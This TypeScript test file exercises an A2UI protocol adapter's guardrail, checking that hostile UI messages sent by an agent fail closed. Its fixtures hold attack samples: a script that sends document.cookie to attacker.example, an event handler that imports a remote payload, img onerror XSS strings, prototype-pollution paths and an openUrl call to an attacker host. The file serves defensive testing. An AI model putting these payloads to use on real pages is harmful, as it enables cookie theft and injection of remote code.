// @spec:029-adapter-a2ui
// User Story 2 (P1): hostile protocol input fails closed. These are the
// adversarial scenarios behind the Art. VIII guardrail, written in the A2UI
// v0.9.1 message shapes (`specification/v0_9_1/json/server_to_client.json`):
// a forbidden type, an undeclared action, an unknown property carrying code,
// active content in the data model, a hostile payload under an unmapped type,
// a capability function, and prototype-polluting data paths. Nothing renders
// from a rejection and no code path opens from message data.
import type { RenderOptions, RenderResult } from '@kimen/catalog';
import { renderUiSpec } from '@kimen/catalog';
import { beforeEach, describe, expect, it } from 'vitest';

import type { A2uiActionMessage, A2uiErrorMessage } from '../src/index.js';
import { A2UI_BASIC_CATALOG_IDS, createA2uiAdapter } from '../src/index.js';

let surface: HTMLElement;

/** Activates the first element matching `selector`, failing the test when it is absent. */
const activate = (root: Element, selector: string): void => {
  const target = root.querySelector<HTMLElement>(selector);
  if (target === null) {
    throw new Error(`no ${selector} rendered`);
  }
  target.click();
};

beforeEach(() => {
  document.body.replaceChildren();
  surface = document.createElement('div');
  document.body.appendChild(surface);
});

const BASIC = A2UI_BASIC_CATALOG_IDS[0] ?? '';
const create = (surfaceId = 's') => ({
  version: 'v0.9.1',
  createSurface: { surfaceId, catalogId: BASIC },
});
const update = (components: unknown[], surfaceId = 's') => ({
  version: 'v0.9.1',
  updateComponents: { surfaceId, components },
});

const button = (id: string, label: string, action: unknown) => [
  { id, component: 'Button', child: `${id}-label`, action },
  { id: `${id}-label`, component: 'Text', text: label },
];

const orderSurface = () =>
  update([
    { id: 'root', component: 'Card', child: 'confirm' },
    ...button('confirm', 'Confirm order', { event: { name: 'confirm-order' } }),
  ]);

describe('the guardrail is a security boundary no message can bypass', () => {
  it('S7 rejects a message using a type the matrix declares forbidden', () => {
    const adapter = createA2uiAdapter({ surface });
    adapter.apply(create());

    const result = adapter.apply(
      update([
        { id: 'root', component: 'Card', child: 'title' },
        { id: 'title', component: 'Text', text: 'Hi' },
        // Not even reachable from root: the whole message is still rejected.
        {
          id: 'evil',
          component: 'html',
          content: "<script>fetch('https://attacker.example/'+document.cookie)</script>",
        },
      ]),
    );

    expect(result.ok).toBe(false);
    expect(result.diagnostics.some((d) => d.rule === 'forbidden-type' && d.value === 'html')).toBe(
      true,
    );
    expect(surface.childNodes).toHaveLength(0);
  });

  it('S8 never dispatches an action outside the declared set', () => {
    const events: A2uiActionMessage[] = [];
    const adapter = createA2uiAdapter({
      onAction: (event) => events.push(event),
      surface,
    });
    adapter.apply(create());
    adapter.apply(orderSurface());

    const result = adapter.apply(
      update([
        { id: 'root', component: 'Card', child: 'export' },
        ...button('export', 'Export', {
          event: { name: 'export-account-data' },
        }),
      ]),
    );

    expect(result.ok).toBe(false);
    expect(result.diagnostics[0]).toMatchObject({
      rule: 'undeclared-action',
      value: 'export-account-data',
    });
    // The previous surface stays; activating what is rendered never yields the undeclared action.
    activate(surface, 'ki-button');
    expect(events.map((e) => e.action.name)).toStrictEqual(['confirm-order']);
  });

  it('S8 honours a host-declared action set from the first render', () => {
    const adapter = createA2uiAdapter({ actions: ['confirm-order'], surface });
    adapter.apply(create());

    const result = adapter.apply(
      update([
        { id: 'root', component: 'Card', child: 'export' },
        ...button('export', 'Export', {
          event: { name: 'export-account-data' },
        }),
      ]),
    );

    expect(result.diagnostics[0]?.rule).toBe('undeclared-action');
    expect(surface.childNodes).toHaveLength(0);
  });

  it('S9 rejects an unknown property on a catalog component', () => {
    const adapter = createA2uiAdapter({ surface });
    adapter.apply(create());

    const result = adapter.apply(
      update([
        {
          id: 'root',
          component: 'Button',
          child: 'label',
          action: { event: { name: 'go' } },
          onPointerEnter: "import('https://attacker.example/payload.js')",
        },
        { id: 'label', component: 'Text', text: 'Go' },
      ]),
    );

    expect(result.ok).toBe(false);
    expect(result.diagnostics[0]).toMatchObject({
      rule: 'unknown-property',
      value: 'onPointerEnter',
    });
    expect(surface.childNodes).toHaveLength(0);
  });

  it('S10 renders data-model content as inert text, never as code', () => {
    const adapter = createA2uiAdapter({ surface });
    adapter.apply(create());
    adapter.apply(
      update([
        { id: 'root', component: 'Card', child: 'label' },
        { id: 'label', component: 'Text', text: { path: '/label' } },
      ]),
    );

    const payload = '<img src=x onerror=alert(document.domain)>';
    const result = adapter.apply({
      version: 'v0.9.1',
      updateDataModel: { surfaceId: 's', path: '/label', value: payload },
    });

    expect(result.ok).toBe(true);
    expect(surface.textContent).toBe(payload);
    expect(surface.querySelector('img')).toBeNull();
  });

  it('S10 reads bindings from the model own data only and refuses polluting paths', () => {
    const adapter = createA2uiAdapter({ surface });
    adapter.apply(create());
    adapter.apply(
      update([
        { id: 'root', component: 'Card', child: 'label' },
        { id: 'label', component: 'Text', text: { path: '/toString' } },
      ]),
    );
    expect(surface.textContent).toBe('');

    for (const path of ['/__proto__/polluted', '/a/constructor/prototype', '/x/prototype']) {
      const result = adapter.apply({
        version: 'v0.9.1',
        updateDataModel: { surfaceId: 's', path, value: 'yes' },
      });
      expect(result.ok).toBe(false);
      expect(result.diagnostics[0]?.rule).toBe('forbidden-key');
    }
    expect(({} as Record<string, unknown>)['polluted']).toBeUndefined();

    const bound = adapter.apply(
      update([
        {
          id: 'label',
          component: 'Text',
          text: { path: '/__proto__/polluted' },
        },
      ]),
    );
    expect(bound.diagnostics[0]?.rule).toBe('forbidden-key');
  });

  it('S11 never lets a hostile payload under an unmapped type reach the fallback', () => {
    const adapter = createA2uiAdapter({ surface });
    adapter.apply(create());

    const result = adapter.apply(
      update([
        { id: 'root', component: 'Card', child: 'video' },
        {
          id: 'video',
          component: 'Video',
          url: '<img src=x onerror=alert(1)>',
        },
      ]),
    );

    expect(result.ok).toBe(true);
    expect(surface.textContent).toBe('Unsupported component');
    expect(surface.innerHTML).not.toContain('onerror');
    expect(surface.querySelector('img')).toBeNull();
  });

  it('S12 sends every render call to the guarded renderer alone', () => {
    const calls: unknown[] = [];
    const observed: MutationRecord[] = [];
    const observer = new MutationObserver((records) => observed.push(...records));
    const double = (input: unknown, options: RenderOptions): RenderResult => {
      calls.push(input);
      return renderUiSpec(input, options);
    };
    const adapter = createA2uiAdapter({ render: double, surface });
    observer.observe(surface, { childList: true, subtree: true });

    adapter.apply(create());
    adapter.apply(
      update([
        { id: 'root', component: 'Column', children: ['a', 'b'] },
        { id: 'a', component: 'Text', text: 'A' },
        { id: 'b', component: 'NotInCatalog', text: '<b>x</b>' },
      ]),
    );
    adapter.apply({
      version: 'v0.9.1',
      updateDataModel: { surfaceId: 's', path: '/k', value: 1 },
    });
    adapter.apply({ version: 'v0.9.1', deleteSurface: { surfaceId: 's' } });
    observed.push(...observer.takeRecords());
    observer.disconnect();

    // Two renders (updateComponents, updateDataModel); create/delete render nothing.
    expect(calls).toHaveLength(2);
    expect(surface.querySelector('b')).toBeNull();
    expect(observed.length).toBeGreaterThan(0);
  });

  it('S17 refuses a client function that reaches a browser capability', () => {
    const adapter = createA2uiAdapter({ surface });
    adapter.apply(create());

    // Action.functionCall with openUrl (catalog.json `openUrl`): allowlist is empty.
    const viaAction = adapter.apply(
      update([
        { id: 'root', component: 'Card', child: 'go' },
        ...button('go', 'Open', {
          functionCall: {
            call: 'openUrl',
            args: { url: 'https://attacker.example/' },
          },
        }),
      ]),
    );
    expect(viaAction.ok).toBe(false);
    expect(viaAction.diagnostics[0]).toMatchObject({
      rule: 'forbidden-function',
      value: 'openUrl',
    });

    // The same function in a value position is refused too.
    const viaValue = adapter.apply(
      update([
        { id: 'root', component: 'Card', child: 't' },
        {
          id: 't',
          component: 'Text',
          text: { call: 'openUrl', args: { url: 'https://attacker.example/' } },
        },
      ]),
    );
    expect(viaValue.diagnostics[0]).toMatchObject({
      rule: 'forbidden-function',
      value: 'openUrl',
    });
    expect(surface.childNodes).toHaveLength(0);
  });

  it('S19 reports a rejected message to the agent as a VALIDATION_FAILED error', () => {
    const errors: A2uiErrorMessage[] = [];
    const adapter = createA2uiAdapter({
      onError: (error) => errors.push(error),
      surface,
    });
    adapter.apply(create());

    adapter.apply(update([{ id: 'root', component: 'Card', child: 'x', style: 'color:red' }]));

    expect(errors).toStrictEqual([
      {
        version: 'v0.9.1',
        error: {
          code: 'VALIDATION_FAILED',
          surfaceId: 's',
          path: '/components/root/style',
          message: 'Card does not declare the property "style"',
        },
      },
    ]);
  });

  it('fails closed on malformed envelopes, cycles and pathological depth', () => {
    const adapter = createA2uiAdapter({ surface });
    adapter.apply(create());

    for (const message of [
      null,
      'text',
      { version: 'v0.9.1' },
      {
        version: 'v0.9.1',
        updateComponents: { surfaceId: 's', components: [] },
      },
      {
        version: 'v0.9.1',
        updateComponents: { surfaceId: 's', components: [{ id: 'root' }] },
      },
      {
        version: 'v0.9.1',
        createSurface: { surfaceId: 'x', catalogId: BASIC },
        deleteSurface: { surfaceId: 'x' },
      },
      {
        version: 'v0.9.1',
        updateDataModel: { surfaceId: 's', path: 'relative', value: 1 },
      },
      { version: 'v0.9.1', updateDataModel: { surfaceId: 's', contents: [] } },
    ]) {
      const result = adapter.apply(message);
      expect(result.ok).toBe(false);
      expect(result.diagnostics[0]?.rule).toBe('malformed-message');
    }

    const cycle = adapter.apply(
      update([
        { id: 'root', component: 'Card', child: 'a' },
        { id: 'a', component: 'Card', child: 'root' },
      ]),
    );
    expect(cycle.diagnostics[0]?.rule).toBe('cycle');

    const deep = Array.from({ length: 300 }, (_, index) => ({
      id: index === 0 ? 'root' : `n${String(index)}`,
      component: 'Card',
      child: `n${String(index + 1)}`,
    }));
    expect(adapter.apply(update(deep)).diagnostics[0]?.rule).toBe('depth-budget');
    expect(surface.childNodes).toHaveLength(0);
  });
});
